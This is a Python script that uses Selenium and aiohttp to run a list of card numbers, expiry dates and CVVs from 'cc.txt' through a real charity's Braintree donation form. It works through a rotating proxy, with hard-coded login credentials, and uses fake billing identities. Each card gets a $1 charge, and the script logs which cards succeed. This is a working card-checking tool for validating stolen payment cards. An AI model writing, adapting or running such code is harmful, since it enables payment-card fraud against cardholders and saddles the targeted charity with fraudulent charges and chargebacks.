
import aiohttp
import asyncio
from aiohttp_socks import ProxyConnector
import json
import random
import string
from bs4 import BeautifulSoup
from urllib.parse import urlencode
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.by import By
import time
import traceback

USE_PROXY = True
PROXY_URL = "p.webshare.io:80:oflsezyn-rotate:xqa3dizvckev"

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:133.0) Gecko/20100101 Firefox/133.0"
CONTENT_TYPE = "application/x-www-form-urlencoded"
DONATION_URL = 'https://www.curtaincallbraintree.org/donate/'

def parse_proxy_url(url):
    parts = url.split(':')
    if len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    elif len(parts) == 4:
        return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    else:
        raise ValueError("Invalid proxy URL format")

def generate_random_info():
    domains = ["gmail.com", "yahoo.com", "hotmail.com", "outlook.com"]
    streets = ["Main St", "Oak Ave", "Maple Rd", "Cedar Ln", "Pine Dr"]
    cities = ["New York", "Los Angeles", "Chicago", "Houston", "Phoenix"]
    states = ["NY", "CA", "IL", "TX", "AZ"]

    email = f"{generate_random_string(8)}@{random.choice(domains)}"
    address = f"{random.randint(100, 9999)} {random.choice(streets)}"
    city = random.choice(cities)
    state = random.choice(states)
    zip_code = f"{random.randint(10000, 99999)}"

    return {
        "email": email,
        "address": address,
        "city": city,
        "state": state,
        "zip_code": zip_code
    }


def get_cards_from_file(filename='cc.txt'):
    cards = []
    try:
        with open(filename, 'r') as f:
            for line in f:
                card_data = line.strip().split('|')
                if len(card_data) != 4:
                    print(f"Invalid card data format: {line.strip()}")
                    continue

                cc, mes, ano, cvv = card_data
                if len(ano) == 2:
                    ano = "20" + ano

                cards.append({
                    'number': cc,
                    'exp_month': mes,
                    'exp_year': ano,
                    'cvv': cvv
                })
        return cards
    except Exception as e:
        print(f"Error reading card data: {str(e)}")
        return []


def save_result(result, filename='completed_random_check.txt'):
    try:
        with open(filename, 'a', encoding='utf-8') as f:
            f.write(result + '\n')
    except Exception as e:
        print(f"Error saving result: {str(e)}")

def generate_random_string(length=10):
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def setup_selenium_driver(headless=True, proxy=None):
    chrome_options = Options()
    if headless:
        chrome_options.add_argument("--headless")
    if proxy:
        chrome_options.add_argument(f'--proxy-server={proxy}')

    driver = webdriver.Chrome(options=chrome_options)
    return driver

async def get_payment_nonce(driver):
    nonce_script = """
        var noncePromise = new Promise(function(resolve, reject) {
            braintree.client.create({
                authorization: document.querySelector('input[name="braintree_authorization_token"]').value
            }, function (clientErr, clientInstance) {
                if (clientErr) {
                    console.error("Error creating Braintree client:", clientErr);
                    reject(clientErr);
                    return;
                }
                braintree.hostedFields.create({
                    client: clientInstance,
                        styles: {
                        'input': {
                            'font-size': '16px',
                            'color': '#000',
                        }
                        },
                    fields: {
                            number: {selector: '#braintree-hosted-fields-number'},
                            cvv: {selector: '#braintree-hosted-fields-cvv'},
                            expirationMonth: {selector: '#braintree-hosted-fields-expirationMonth'},
                            expirationYear: {selector: '#braintree-hosted-fields-expirationYear'}
                        }
                }, function (hostedFieldsErr, hostedFieldsInstance) {
                    if (hostedFieldsErr) {
                        console.error("Error creating hosted fields:", hostedFieldsErr);
                        reject(hostedFieldsErr)
                        return;
                    }
                    hostedFieldsInstance.tokenize(function(tokenizeErr, payload) {
                        if(tokenizeErr){
                            console.error("Error during tokenization:", tokenizeErr);
                            reject(tokenizeErr)
                            return;
                        }
                    resolve(payload.nonce);
                });
            });
            });
        });
        return noncePromise;
    """

    try:
        payment_nonce = await driver.execute_async_script(nonce_script)
        if not payment_nonce:
            print("Failed to generate payment nonce.")
            return None
        return payment_nonce
    except Exception as e:
        print(f"Error getting payment nonce: {e}")
        print(traceback.format_exc())
        return None

async def submit_payment(session, form_action, form_data, headers):
  try:
    async with session.post(form_action, headers=headers, data=form_data) as response:
        response_text = await response.text()
        if response.status == 200:
            symbol = "✓"
            message = "Donation success"
            decline_code = "N/A"
        else:
            symbol = "X"
            message = f"Donation failed: HTTP {response.status}"
            decline_code = "N/A"
        return symbol, message, decline_code
  except Exception as e:
    print(f"Error submitting payment: {e}")
    print(traceback.format_exc())
    return "X", f"Donation failed: {str(e)}", "N/A"


async def process_card(session, card, headers, donation_amount=1):
    random_info = generate_random_info()
    driver = setup_selenium_driver(headless=True, proxy=parse_proxy_url(PROXY_URL) if USE_PROXY else None)

    try:
        driver.get(DONATION_URL)
        WebDriverWait(driver, 10).until(EC.presence_of_element_located((By.ID, 'braintree-hosted-fields-number')))

        # Fill in the credit card fields using selenium
        driver.find_element(By.ID, "braintree-hosted-fields-number").send_keys(card['number'])
        driver.find_element(By.ID, "braintree-hosted-fields-expirationMonth").send_keys(card['exp_month'])
        driver.find_element(By.ID, "braintree-hosted-fields-expirationYear").send_keys(card['exp_year'])
        driver.find_element(By.ID, "braintree-hosted-fields-cvv").send_keys(card['cvv'])
        
        time.sleep(2)
        
        payment_nonce = await get_payment_nonce(driver)
        if not payment_nonce:
            return

        page_html = driver.page_source
        soup = BeautifulSoup(page_html, 'html.parser')
        form = soup.find('form', {'id': 'donation-form'})

        if not form:
            print("Form not found on the page.")
            return
        
        form_action = form.get('action')
        csrf_token_input = form.find('input', {'name': 'csrfmiddlewaretoken'})
        braintree_token = soup.find('input', {'name': 'braintree_authorization_token'})

        if not all([form_action, csrf_token_input, braintree_token]):
            print("Could not extract all necessary data from the form.")
            return

        csrf_token_value = csrf_token_input['value']
        braintree_token_value = braintree_token['value']

        form_data = {
            'csrfmiddlewaretoken': csrf_token_value,
            'donation_amount': donation_amount,
            'billing_first_name': "John",
            'billing_last_name': "Doe",
            'billing_email': random_info["email"],
            'billing_address_1': random_info["address"],
            'billing_city': random_info["city"],
            'billing_state': random_info["state"],
            'billing_zip': random_info["zip_code"],
            'billing_country': 'US',
            'payment_method_nonce': payment_nonce,
            'braintree_authorization_token': braintree_token_value
        }
        
        symbol, message, decline_code = await submit_payment(session, form_action, form_data, headers)
        result = f"{symbol} {message} | {decline_code} - {card['number']}|{card['exp_month']}|{card['exp_year']}|{card['cvv']}"
        print(result)
        save_result(result)
    except Exception as e:
        print(f"An error occurred during the donation attempt: {e}")
        print(traceback.format_exc())
    finally:
        if driver:
            driver.quit()



async def test_payment_flow():
    cards = get_cards_from_file()
    if not cards:
        print("No valid cards found. Exiting.")
        return

    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Content-Type": CONTENT_TYPE,
        "Origin": "https://www.curtaincallbraintree.org",
        "Connection": "keep-alive",
        "Upgrade-Insecure-Requests": "1",
        "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate",
        "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-User": "?1"
    }
    connector = ProxyConnector.from_url(parse_proxy_url(PROXY_URL)) if USE_PROXY else None
    async with aiohttp.ClientSession(connector=connector) as session:
        for card in cards:
            await process_card(session, card, headers, 1)

if __name__ == "__main__":
    asyncio.run(test_payment_flow())

